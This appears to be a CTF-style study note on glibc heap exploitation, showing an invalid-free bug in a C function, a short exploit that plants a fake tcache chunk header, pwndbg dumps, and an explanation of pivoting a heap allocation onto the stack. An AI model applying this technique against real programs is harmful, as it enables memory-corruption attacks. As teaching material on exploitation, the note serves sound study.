# Heap 
heap vulnerabilities consist of:
1. problems on freeing stuff
2. reading uninitialized chunks
3. buffer overflow to neighbour chunks
# Invalid free 
```c
void blast(char* buf) {
    // Vul_3: Invalid Free
    read(STDIN_FILENO, buf, 0x20);
    free(buf+0x10);
}
```
## corresponding exploit:
```py
add_record(0x100, b'A' * 8)
blast(p64(0) + p64(0xf1))
add_record(0xe8, b'A' * 8)
```
## what is in tcachebins after `blast`:
```
pwndbg> tcachebins
tcachebins
0xf0 [  1]: 0x7fffdb4cb010 ◂— 0
pwndbg> tele 0x7fffdb4cb010-0x10
00:0000│-030 0x7fffdb4cb000 ◂— 0x31 /* '1' */
01:0008│-028 0x7fffdb4cb008 ◂— 0xf1
02:0010│-020 0x7fffdb4cb010 ◂— 0
03:0018│-018 0x7fffdb4cb018 —▸ 0x55ce54e9e010 ◂— 0
04:0020│-010 0x7fffdb4cb020 —▸ 0x55ce42f2c180 (_start) ◂— endbr64 
05:0028│-008 0x7fffdb4cb028 ◂— 0x6819b5d8d1cd2900
06:0030│ rbp 0x7fffdb4cb030 —▸ 0x7fffdb4cb040 ◂— 0
07:0038│+008 0x7fffdb4cb038 —▸ 0x55ce42f2ca62 (main+142) ◂— mov eax, 0
```
## How does the chunk look like after `add_record(0xe8, b'A' * 8)`:
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55ce54e9e000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x55ce54e9e290
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x55ce54e9e2b0
Size: 0x110 (with flag bits: 0x111)

Allocated chunk | PREV_INUSE
Addr: 0x55ce54e9e3c0
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x55ce54e9e3e0
Size: 0x20c20 (with flag bits: 0x20c21)

pwndbg> tele 0x55ce54e9e3c0
00:0000│  0x55ce54e9e3c0 ◂— 0
01:0008│  0x55ce54e9e3c8 ◂— 0x21 /* '!' */
02:0010│  0x55ce54e9e3d0 ◂— 0x3ff0000000000000
03:0018│  0x55ce54e9e3d8 ◂— 0xe8
04:0020│  0x55ce54e9e3e0 —▸ 0x7fffdb4cb010 ◂— 'AAAAAAAA'
05:0028│  0x55ce54e9e3e8 ◂— 0x20c21
06:0030│  0x55ce54e9e3f0 ◂— 0
07:0038│  0x55ce54e9e3f8 ◂— 0
pwndbg> tele 0x7fffdb4cb010
00:0000│-020 0x7fffdb4cb010 ◂— 'AAAAAAAA'
01:0008│-018 0x7fffdb4cb018 ◂— 0
02:0010│-010 0x7fffdb4cb020 —▸ 0x55ce42f2c180 (_start) ◂— endbr64 
03:0018│-008 0x7fffdb4cb028 ◂— 0x6819b5d8d1cd2900
04:0020│ rbp 0x7fffdb4cb030 —▸ 0x7fffdb4cb040 ◂— 0
05:0028│+008 0x7fffdb4cb038 —▸ 0x55ce42f2ca62 (main+142) ◂— mov eax, 0
06:0030│+010 0x7fffdb4cb040 ◂— 0
07:0038│+018 0x7fffdb4cb048 —▸ 0x7fb1d2c43083 (__libc_start_main+243) ◂— mov edi, eax
```

### explanation of the above 

1. First allocation:
```python
add_record(0x100, b'A' * 8)  # Creates a normal chunk
```

2. The invalid free exploitation:
```python
blast(p64(0) + p64(0xf1))    # Creates a fake chunk header
```
- The `blast` function reads input at `buf` but frees `buf+0x10`
- Writing fake chunk header `p64(0) + p64(0xf1)`:
  - `p64(0)`: prev_size field
  - `p64(0xf1)`: size field indicating a chunk of size 0xf0
- When `free(buf+0x10)` is called, malloc reads the metadata from `buf` (which is 0x10 bytes before the free location)
- This fake chunk of size 0xf0 gets added to the tcachebin  
That is why tcachebin state shows:
```
tcachebins
0xf0 [  1]: 0x7fffdb4cb010 ◂— 0
```
- A chunk of size 0xf0 is now in tcache
- The chunk address is on the stack (0x7fffdb4cb010)
3. Final allocation:
```python
add_record(0xe8, b'A' * 8)   # Allocates from our fake free'd chunk
```
- Size 0xe8 fits in our fake 0xf0 chunk
- This allocation returns the pointer to our fake chunk on the stack
- Now we have control over stack memory through heap operations

This is a heap-to-stack pivot, where we've tricked malloc into treating stack memory as if it were heap memory. 